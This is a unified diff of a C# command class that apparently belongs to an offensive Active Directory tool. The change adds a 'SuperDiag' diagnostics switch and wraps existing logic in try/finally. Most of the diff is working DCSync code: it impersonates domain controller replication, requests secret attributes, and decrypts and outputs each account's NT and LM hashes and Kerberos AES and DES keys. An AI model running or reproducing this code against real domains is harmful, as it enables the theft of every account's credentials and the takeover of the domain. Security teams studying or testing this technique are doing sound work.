@@ -32,120 +32,137 @@ internal class DcSyncCommand : DrsCommand
 	[Description("Naming context (distinguished name) to replicate from. Default: auto-detected from the DC.")]
 	public string? NamingContext { get; set; }
 
+	[Parameter]
+	[Description("Enables extra diagnostics for DRS bind attempts (profiles, blob details, and return codes).")]
+	public SwitchParam SuperDiag { get; set; }
+
 	protected override async Task<int> RunAsync(DrsClient client, CancellationToken cancellationToken)
 	{
-		using var dsa = await client.BindAsync(DrsClient.NtdsApiClientGuid, cancellationToken).ConfigureAwait(false);
-
-		// Resolve naming context if not explicitly provided
-		string nc;
-		if (!string.IsNullOrEmpty(this.NamingContext))
+		if (this.SuperDiag.IsSet)
 		{
-			nc = this.NamingContext;
-		}
-		else
-		{
-			nc = await ResolveDefaultNamingContextAsync(dsa, cancellationToken).ConfigureAwait(false);
-			this.WriteVerbose($"Using naming context: {nc}");
+			this.WriteWarning("SuperDiag enabled (marker: drs-superdiag-v1).");
+			client.DiagnosticSink = this.WriteWarning;
 		}
 
-		string? targetDn = null;
-		if (!string.IsNullOrEmpty(this.Identity))
+		try
 		{
-			targetDn = await ResolveIdentityToDnAsync(dsa, this.Identity, cancellationToken).ConfigureAwait(false);
-			if (targetDn == null)
+			using var dsa = await client.BindAsync(DrsClient.NtdsApiClientGuid, cancellationToken).ConfigureAwait(false);
+
+			// Resolve naming context if not explicitly provided
+			string nc;
+			if (!string.IsNullOrEmpty(this.NamingContext))
 			{
-				this.WriteError($"Could not resolve identity '{this.Identity}' to a distinguished name.");
-				return 1;
+				nc = this.NamingContext;
 			}
-			this.WriteVerbose($"Resolved identity to: {targetDn}");
-		}
+			else
+			{
+				nc = await ResolveDefaultNamingContextAsync(dsa, cancellationToken).ConfigureAwait(false);
+				this.WriteVerbose($"Using naming context: {nc}");
+			}
 
-		byte[] sessionKey = client.GetSessionKey();
+			string? targetDn = null;
+			if (!string.IsNullOrEmpty(this.Identity))
+			{
+				targetDn = await ResolveIdentityToDnAsync(dsa, this.Identity, cancellationToken).ConfigureAwait(false);
+				if (targetDn == null)
+				{
+					this.WriteError($"Could not resolve identity '{this.Identity}' to a distinguished name.");
+					return 1;
+				}
+				this.WriteVerbose($"Resolved identity to: {targetDn}");
+			}
 
-		// Attribute type IDs for secret attributes (resolved via the prefix table at decode time).
-		// We don't filter here; we let the DC send all attributes and decode what we recognise.
+			byte[] sessionKey = client.GetSessionKey();
 
-		var flags =
-			DRS_OPTIONS.DRS_INIT_SYNC |
-			DRS_OPTIONS.DRS_WRIT_REP |
-			DRS_OPTIONS.DRS_GET_ANC |
-			DRS_OPTIONS.DRS_NEVER_SYNCED |
-			DRS_OPTIONS.DRS_SPECIAL_SECRET_PROCESSING;
+			// Attribute type IDs for secret attributes (resolved via the prefix table at decode time).
+			// We don't filter here; we let the DC send all attributes and decode what we recognise.
 
-		(List<REPLENTINFLIST> entries, SCHEMA_PREFIX_TABLE prefixTable) =
-			await dsa.GetNCChangesWithPrefixTableAsync(
-				targetDn ?? nc,
-				flags,
-				partialAttrs: null,
-				objectGuid: Guid.Empty,
-				cancellationToken).ConfigureAwait(false);
-		this.WriteVerbose($"DRSGetNCChanges returned {entries.Count} raw entry nodes.");
-		if (entries.Count == 0)
-		{
-			this.WriteWarning(
-				"DRSGetNCChanges returned no entries. This usually means insufficient replication rights " +
-				"or an incorrect naming context/identity.");
+			var flags =
+				DRS_OPTIONS.DRS_INIT_SYNC |
+				DRS_OPTIONS.DRS_WRIT_REP |
+				DRS_OPTIONS.DRS_GET_ANC |
+				DRS_OPTIONS.DRS_NEVER_SYNCED |
+				DRS_OPTIONS.DRS_SPECIAL_SECRET_PROCESSING;
+
+			(List<REPLENTINFLIST> entries, SCHEMA_PREFIX_TABLE prefixTable) =
+				await dsa.GetNCChangesWithPrefixTableAsync(
+					targetDn ?? nc,
+					flags,
+					partialAttrs: null,
+					objectGuid: Guid.Empty,
+					cancellationToken).ConfigureAwait(false);
+			this.WriteVerbose($"DRSGetNCChanges returned {entries.Count} raw entry nodes.");
+			if (entries.Count == 0)
+			{
+				this.WriteWarning(
+					"DRSGetNCChanges returned no entries. This usually means insufficient replication rights " +
+					"or an incorrect naming context/identity.");
+				return 0;
+			}
+
+			var results = new List<DcSyncResult>();
+
+			foreach (var entryNode in entries)
+			{
+				var decoded = DrsAttributeDecoder.Decode(entryNode.Entinf.AttrBlock, prefixTable);
+
+				// Skip objects with no credentials
+				if (decoded.EncryptedNtHash == null && decoded.SamAccountName == null)
+					continue;
+
+				var result = new DcSyncResult
+				{
+					SamAccountName = decoded.SamAccountName,
+					DistinguishedName = entryNode.Entinf.pName?.value.GetName(),
+					Sid = decoded.GetSidString(),
+				};
+
+				if (decoded.EncryptedNtHash != null)
+				{
+					byte[]? ntHash = DrsSecretDecryptor.DecryptHash(decoded.EncryptedNtHash, sessionKey);
+					if (ntHash != null)
+						result.NtHash = Convert.ToHexString(ntHash).ToLowerInvariant();
+				}
+
+				if (decoded.EncryptedLmHash != null)
+				{
+					byte[]? lmHash = DrsSecretDecryptor.DecryptHash(decoded.EncryptedLmHash, sessionKey);
+					if (lmHash != null && !IsNullHash(lmHash))
+						result.LmHash = Convert.ToHexString(lmHash).ToLowerInvariant();
+				}
+
+				if (decoded.EncryptedSupplementalCredentials != null)
+				{
+					KerberosKeys? keys = DrsSecretDecryptor.DecryptSupplementalCredentials(
+						decoded.EncryptedSupplementalCredentials, sessionKey);
+					if (keys != null)
+					{
+						result.Aes256Key = keys.Aes256;
+						result.Aes128Key = keys.Aes128;
+						result.DesKey = keys.DesCbcMd5;
+					}
+				}
+
+				results.Add(result);
+			}
+
+			if (results.Count == 0)
+			{
+				this.WriteWarning(
+					$"Retrieved {entries.Count} directory entries, but none contained decodable credential attributes.");
+			}
+			else
+			{
+				this.WriteVerbose($"Decoded {results.Count} credential records.");
+			}
+
+			this.WriteRecords(results);
 			return 0;
 		}
-
-		var results = new List<DcSyncResult>();
-
-		foreach (var entryNode in entries)
+		finally
 		{
-			var decoded = DrsAttributeDecoder.Decode(entryNode.Entinf.AttrBlock, prefixTable);
-
-			// Skip objects with no credentials
-			if (decoded.EncryptedNtHash == null && decoded.SamAccountName == null)
-				continue;
-
-			var result = new DcSyncResult
-			{
-				SamAccountName = decoded.SamAccountName,
-				DistinguishedName = entryNode.Entinf.pName?.value.GetName(),
-				Sid = decoded.GetSidString(),
-			};
-
-			if (decoded.EncryptedNtHash != null)
-			{
-				byte[]? ntHash = DrsSecretDecryptor.DecryptHash(decoded.EncryptedNtHash, sessionKey);
-				if (ntHash != null)
-					result.NtHash = Convert.ToHexString(ntHash).ToLowerInvariant();
-			}
-
-			if (decoded.EncryptedLmHash != null)
-			{
-				byte[]? lmHash = DrsSecretDecryptor.DecryptHash(decoded.EncryptedLmHash, sessionKey);
-				if (lmHash != null && !IsNullHash(lmHash))
-					result.LmHash = Convert.ToHexString(lmHash).ToLowerInvariant();
-			}
-
-			if (decoded.EncryptedSupplementalCredentials != null)
-			{
-				KerberosKeys? keys = DrsSecretDecryptor.DecryptSupplementalCredentials(
-					decoded.EncryptedSupplementalCredentials, sessionKey);
-				if (keys != null)
-				{
-					result.Aes256Key = keys.Aes256;
-					result.Aes128Key = keys.Aes128;
-					result.DesKey = keys.DesCbcMd5;
-				}
-			}
-
-			results.Add(result);
+			client.DiagnosticSink = null;
 		}
-
-		if (results.Count == 0)
-		{
-			this.WriteWarning(
-				$"Retrieved {entries.Count} directory entries, but none contained decodable credential attributes.");
-		}
-		else
-		{
-			this.WriteVerbose($"Decoded {results.Count} credential records.");
-		}
-
-		this.WriteRecords(results);
-		return 0;
 	}
 
 	/// <summary>
